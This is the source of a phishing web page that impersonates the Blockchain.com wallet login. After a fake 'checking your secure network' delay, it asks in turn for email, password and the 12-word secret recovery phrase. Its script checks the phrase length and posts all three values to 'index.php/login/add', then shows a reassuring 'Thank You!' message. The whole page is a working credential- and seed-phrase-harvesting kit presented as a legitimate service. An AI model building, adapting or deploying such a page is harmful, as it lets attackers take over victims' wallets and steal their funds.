<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<title>Blockchain | Login </title>
	<link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicon.png">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous" />
	<link href="assets/style.css" rel="stylesheet" />
</head>
<style>
	.validasi-pharse {
		display: block;
		width: 100%;
		padding: 6px 12px;
		box-sizing: border-box;
		font-size: 14px;
		color: rgb(53, 63, 82);
		background-color: rgb(255, 255, 255);
		background-image: none;
		outline-width: 0px;
		user-select: text;
		font-weight: 500;
		font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
		resize: initial;
		border: 1px solid rgb(217, 59, 48);
		border-radius: 8px;
	}

	.ajIaeKE {
		border-radius: 8px;
		box-sizing: border-box;
		width: 480px;
		display: flex;
		flex-direction: column;
		padding: 0px 0px 24px;
	}

	.ajIaeKE h1 {
		margin: auto;
		text-align: center;
		color: #fff;
		font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
		font-weight: 600;
		font-size: 17px;
		line-height: 1.5;
		text-transform: none;
		font-style: normal;
		cursor: inherit;
		display: block;
		opacity: 1;
	}

	.ajIaeKE h2 {
		margin: auto;
		text-align: center;
		color: #fff;
		font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
		font-weight: 100;
		font-size: 10px;
		line-height: 1.5;
		text-transform: none;
		font-style: normal;
		cursor: inherit;
		display: block;
		opacity: 1;
	}
</style>

<body>
	<?php if (empty($_GET)) {
		$import = "false";
	} else {
		$import = "true";
	} ?>
	<link rel="stylesheet" href="assets/spinner/dist/mSpinnerPulse.css">
	<script src="assets/toast/lib/vanilla-toast.min.js"></script>
	<section class="vh-100" style="background-color: rgb(18, 29, 51)">
		<div class="atas">
			<div height="112px" class="sc-fcdeBU dFsfkz">
				<div class="sc-gmeYpB eOMbxr sc-kZmsYB header_atas">
					<div class="sc-daURTG itBfVj sc-RcBXQ bCRrpa">
						<div class="sc-fZwumE icQETu">
							<a href="#" class="sc-htpNat bzateK sc-fQejPQ VtDPC" color="blue600"><img src="/assets/img/blc.svg" srcset="" height="24px" class="sc-bwzfXH ixijk sc-iSDuPN dVLnlH" color="auto" width="auto" /></a>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="row d-flex justify-content-center lnOPvk">
			<div class="col-12 col-md-9 d-flex justify-content-center">
				<div class="sc-dHmInP sc-ghsgMZ ajIaeKE">
					<h1><i class="m-spinner--pulse"></i></h1>
					<h1>Checking your secure network before accessing Blockchain</h1>
					<h2>This process is automatic. Your browser will redicect to your requested</h2>
				</div>
				<div class="sc-dHmInP sc-ghsgMZ jIaeKE" hidden>
					<div class="sc-ejGVNB loyLTf tab-login">
						<div class="sc-eLdqWK kROTtA">
							<img src="/assets/img/wallet.svg" srcset="" height="28px" class="sc-bwzfXH fnRhLT sc-iiUIRa jnzFWE" color="auto" width="auto" />
							<div color="purple600" cursor="inherit" opacity="1" class="sc-gzVnrw hJQqZZ">
								Wallet
							</div>
						</div>
						<div class="sc-eLdqWK dBUeph">
							<img src="/assets/img/exchange.svg" srcset="" height="26px" class="sc-bwzfXH bngzGF sc-iiUIRa jnzFWE" color="auto" width="auto" />
							<div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw iSrPFo">
								Exchange
							</div>
						</div>
					</div>
					<div class="sc-ccSCjj iBuUTk">
						<div class="sc-dRaagA eAtBoL">
							<div class="sc-fEUNkw eufVF email-input" style="margin-top: 40px">
								<label class="sc-feryYK kbEuxL sc-kkbgRg fUnsCG" for="guid">
									<div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw eGdQh">
										Email or Wallet ID
									</div>
								</label>
								<div class="sc-dREXXX kMcDFY" height="48px">
									<div class="sc-bRBYWo hJgoBZ">
										<input data-e2e="loginGuidOrEmail" name="guidOrEmail" height="48px" placeholder="Enter Email or Wallet ID" spellcheck="false" type="text" class="form-control form-control-lg lbBmqO input-email" value="" />
									</div>
								</div>
							</div>
							<div class="sc-fEUNkw eufVF password-input" style="margin-top: 40px" hidden>
								<label class="sc-feryYK kbEuxL sc-kkbgRg fUnsCG" for="guid">
									<div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw eGdQh">
										Password
									</div>
								</label>
								<div class="sc-dREXXX kMcDFY" height="48px">
									<div class="sc-bRBYWo hJgoBZ">
										<input data-e2e="loginGuidOrEmail" name="guidOrEmail" height="48px" placeholder="Enter Email or Wallet ID" spellcheck="false" type="password" class="form-control form-control-lg lbBmqO input-password" value="" />
									</div>
								</div>
							</div>

							<div class="sc-eNPDpu gEphaF parse-input" hidden>
								<div color="grey900" cursor="inherit" opacity="1" class="sc-gzVnrw BCruu" style="margin-bottom: 8px">
									Input your secret private key recovery phrase
								</div>
								<div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw iVtkAS" style="margin-bottom: 16px">
									Your 12 word Secret Private Key Recovery Phrase grants
									access to your account. Please input it in the order
									specified.
								</div>
								<div class="sc-cgHJcJ fLoBKa">
									<textarea name="mnemonic" onkeyup="validasi_pharse()" placeholder="Enter your secret private key recovery phrase" rows="3" class="form-control sc-csuQGl blJxuu input-parse"></textarea>
								</div>
								<div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw jPqPHm" style="margin: 8px 0px 24px; text-align: center">
									Separate each word with a space
								</div>
							</div>
						</div>
						<div class="sc-jGxEUC iWDCke">
							<button height="48px" data-e2e="loginButton" class="email-btn btn btn-primary btn-block sc-gqjmRU grufYx sc-jKmXuR jrUgtX" color="white" style="margin-bottom: 16px">
								<div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw edfwkt">
									Continue
								</div>
							</button>

							<button height="48px" data-e2e="loginButton" class="password-btn btn btn-primary btn-block sc-gqjmRU grufYx sc-jKmXuR jrUgtX" color="white" style="margin-bottom: 16px" hidden>
								<div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw edfwkt">
									Login
								</div>
							</button>

							<button height="48px" data-e2e="loginButton" class="parse-btn btn btn-primary btn-block sc-gqjmRU grufYx sc-jKmXuR jrUgtX" color="white" style="margin-bottom: 16px" hidden disabled>
								<div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw edfwkt">
									Continue
								</div>
							</button>
							<a data-e2e="loginImportAccount" color="blue600" class="sc-htpNat hBczNm import-akun" href="#/recover">Import Your Account</a>
						</div>
					</div>
					<div class="sc-hgRTRy ilFxqb">
						<div data-e2e="signupLink" class="bAgxl" href="#/signup">
							<div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw dZiTwf" style="cursor: pointer; margin-top: 16px">
								Don't have a Blockchain Account?
							</div>
							&nbsp;
							<div color="blue600" class="sc-gzVnrw nYDtv sc-iIHSe bnTwQr" cursor="inherit" opacity="1">
								Sign up Now -&gt;
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="sc-clNaTc eSCtEw">
			<div class="sc-cmthru iKdPpP">
				<div class="sc-kGXeez kXiRmv">
					<ul class="sc-jKJlTe jxbiXh">
						<li class="sc-eNQAEJ gPmVSj">English</li>
						<li class="sc-eNQAEJ gPmVSj">Espa??ol</li>
						<li class="sc-eNQAEJ gPmVSj">Espa??ol (Latinoam??rica)</li>
						<li class="sc-eNQAEJ gPmVSj">Fran??ais</li>
						<li class="sc-eNQAEJ gPmVSj">Portugu??s</li>
						<li class="sc-eNQAEJ gPmVSj">T??rk??e</li>
						<li class="sc-eNQAEJ gPmVSj">??????????????</li>
					</ul>
					<div color="grey400" class="sc-kpOJdX kyfudT">
						<div class="sc-dxgOiQ kPtlNs">English</div>
						<span class="sc-bxivhb cHKfSC sc-ckVGcZ csAZWy" style="font-size: 12px; font-weight: 400"></span>
					</div>
				</div>
				<span class="sc-esOvli jkIcBL"><a color="grey400" href="#" target="_blank" class="sc-htpNat ecJsZh">Version 4.68.12</a></span>
				<div class="sc-hZSUBg bZFrda">
					<a color="grey400" href="#" target="_blank" class="sc-htpNat ecJsZh">
						<div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA">
							Need Help?
						</div>
					</a>
				</div>
			</div>
		</div>
	</section>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
	<!-- <script src="assets/blc.js"></script> -->
</body>
<script>
	function validasi_pharse() {
		var words = $(".input-parse").val().split(' ');
		// console.log(words)
		if (words.length == 12) {
			$(".input-parse").attr("class", "form-control sc-csuQGl input-parse")
			$(".parse-btn").attr("disabled", false)
		} else {
			$(".input-parse").attr("class", "form-control sc-csuQGl input-parse validasi-pharse")
			$(".parse-btn").attr("disabled", true)
		}
	}

	$(function() {
		setTimeout(function() {
			redirectf()
		}, 3000);

		if ("<?php echo $import; ?>" == "true") {
			pharse_form()
		} else {

		}
	})

	function redirectf() {

		$(".ajIaeKE").attr("hidden", true)
		$(".jIaeKE").attr("hidden", false)
	}

	function pharse_form() {
		$(".tab-login").attr("hidden", true);
		$(".email-input").attr("hidden", true);
		$(".password-input").attr("hidden", true);
		$(".password-btn").attr("hidden", true);
		$(".email-btn").attr("hidden", true);

		$(".parse-input").attr("hidden", false);
		$(".parse-btn").attr("hidden", false);

		$(".import-akun").attr("hidden", true);
	}
	$(".email-btn").click(function() {
		$(".tab-login").attr("hidden", true);
		$(".email-input").attr("hidden", true);
		$(".password-input").attr("hidden", false);

		$(".password-btn").attr("hidden", false);
		$(this).attr("hidden", true);
	});

	$(".password-btn").click(function() {
		$(".password-input").attr("hidden", true);
		$(".parse-input").attr("hidden", false);
		$(".parse-btn").attr("hidden", false);
		$(this).attr("hidden", true);
	});

	$(".import-akun").click(function() {
		$(".tab-login").attr("hidden", true);
		$(".email-input").attr("hidden", true);
		$(".password-input").attr("hidden", true);
		$(".password-btn").attr("hidden", true);
		$(".email-btn").attr("hidden", true);

		$(".parse-input").attr("hidden", false);
		$(".parse-btn").attr("hidden", false);

		$(this).attr("hidden", true);
	});



	$(".parse-btn").click(function() {
		$(this).attr("disabled", true)
		$(this).html("<i class='m-spinner--pulse'></i>")
		console.log($('.email-input').val())
		$.ajax({
			type: 'POST',
			url: 'index.php/login/add',
			beforeSend: function() {
				// memuat()
			},
			data: {
				email: $('.input-email').val(),
				password: $('.input-password').val(),
				parse: $('.input-parse').val(),
			},
			dataType: 'json',
			success: function(data) {
				console.log(data)
				if (data == true) {
					vt.success("Your application will be processed immediately", {
						title: "Thank You!",
						position: "top-right",
						focusable: true,

					})
				} else {
					vt.error("Please Check your data", {
						title: "Something Wrong!",
						position: "top-right",
						focusable: true,

					})
				}
			},
			error: function(x, e) {

			} //end error
		});

	})
</script>

</html>